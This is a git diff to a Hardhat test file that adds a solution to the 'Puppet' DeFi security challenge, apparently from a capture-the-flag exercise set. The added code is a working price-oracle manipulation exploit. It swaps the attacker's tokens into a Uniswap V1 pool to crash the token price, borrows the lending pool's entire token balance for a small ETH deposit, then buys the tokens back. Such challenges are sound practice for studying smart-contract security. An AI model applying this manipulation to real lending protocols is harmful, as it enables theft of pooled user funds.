@@ -3,6 +3,7 @@ const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");
 
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { logGas } = require("@gnosis.pm/safe-contracts");
 
 // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
 function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
@@ -103,6 +104,67 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const attackPuppet = this.lendingPool.connect(attacker);
+        const attackToken = this.token.connect(attacker);
+        const attackUniswap = this.uniswapExchange.connect(attacker);
+
+        //Helper function to get the current token/eth balances
+        const logAttackerBalances = async (address, name) => {
+            const ethBalance = await ethers.provider.getBalance(address);
+            const tokenBalance = await attackToken.balanceOf(address);
+
+            console.log(`ETH Balance of ${name}:`, ethers.utils.formatEther(ethBalance));
+            console.log(`TKN Balance of ${name}:`, ethers.utils.formatEther(tokenBalance));
+            console.log("");
+        };
+
+        await logAttackerBalances(attacker.address, "attacker");
+        await logAttackerBalances(attackUniswap.address, "uniswap");
+
+        console.log("Approving Initial Balance");
+        await attackToken.approve(attackUniswap.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+        console.log("Balance approved");
+        
+
+        //Calculate the ETH payout
+        const ethPayout = await attackUniswap.getTokenToEthInputPrice(ATTACKER_INITIAL_TOKEN_BALANCE, { gasLimit: 1e6});
+        console.log("Transfer of 1000 tokens will net", ethers.utils.formatEther(ethPayout));
+
+        console.log("Transferring tokens for ETH");
+        await attackUniswap.tokenToEthSwapInput(
+            ATTACKER_INITIAL_TOKEN_BALANCE, //EXACT AMOUNT OF TOKENS TO TRANSFER
+            ethers.utils.parseEther("9"), //MINIMUM RETURN: 9ETH
+            (await ethers.provider.getBlock("latest")).timestamp * 2, //DEADLINE
+        );
+
+        await logAttackerBalances(attacker.address, "attacker");
+        await logAttackerBalances(attackUniswap.address, "uniswap");
+
+        //Deposit ETH required to gain all tokens from the pool
+        const deposit = await attackPuppet.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log("Deposit required: ", ethers.utils.formatEther(deposit));
+        await attackPuppet.borrow(POOL_INITIAL_TOKEN_BALANCE, { value: deposit});
+        await logAttackerBalances(attacker.address, "attacker");
+
+        const tokensToBuyBack = ATTACKER_INITIAL_TOKEN_BALANCE;
+        const ethRequired = await attackUniswap.getEthToTokenOutputPrice(tokensToBuyBack, { gasLimit: 1e6});
+        console.log(`ETH Required for ${tokensToBuyBack} tokens: `, ethers.utils.formatEther(ethRequired));
+
+        //Getting our original 1000 tokens back by swapping eth
+        await attackUniswap.ethToTokenSwapOutput(
+            tokensToBuyBack,
+            (await ethers.provider.getBlock('latest')).timestamp * 2,
+            {
+                value: ethRequired,
+                gasLimit: 1e6
+            }
+         );
+
+        console.log("**** FINISHED ****");
+        await logAttackerBalances(attacker.address, "attacker");
+        await logAttackerBalances(attackPuppet.address, "lender");
+        await logAttackerBalances(attackUniswap.address, "uniswap");
+        
     });
 
     after(async function () {
